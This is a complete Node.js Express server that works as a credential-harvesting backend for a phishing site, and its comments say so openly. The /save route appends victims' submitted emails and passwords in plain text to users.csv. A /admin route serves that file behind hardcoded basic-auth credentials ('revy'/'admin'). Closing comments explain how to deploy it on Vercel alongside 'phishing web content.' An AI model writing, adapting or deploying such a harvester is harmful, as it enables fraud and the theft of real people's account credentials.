// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const basicAuth = require('express-basic-auth');

const app = express();
const PORT = process.env.PORT || 3000;

// Basic auth configuration
const ADMIN_USERNAME = 'revy';
const ADMIN_PASSWORD = 'admin';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Save user info
app.post('/save', (req, res) => {
  const { email, password } = req.body;
  const data = `${email},${password}\n`;
  fs.appendFileSync('users.csv', data, 'utf8');
  res.send('Info saved!');
});

// Protect the admin file
app.use(
  '/admin',
  basicAuth({
    users: { [ADMIN_USERNAME]: ADMIN_PASSWORD },
    challenge: true,
  })
);

// Serve the admin file
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'users.csv'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

// Deploy instructions
// 1. Place this script in your Vercel project folder.
// 2. Add the 'public' folder containing your phishing web content.
// 3. Deploy using Vercel CLI or dashboard.
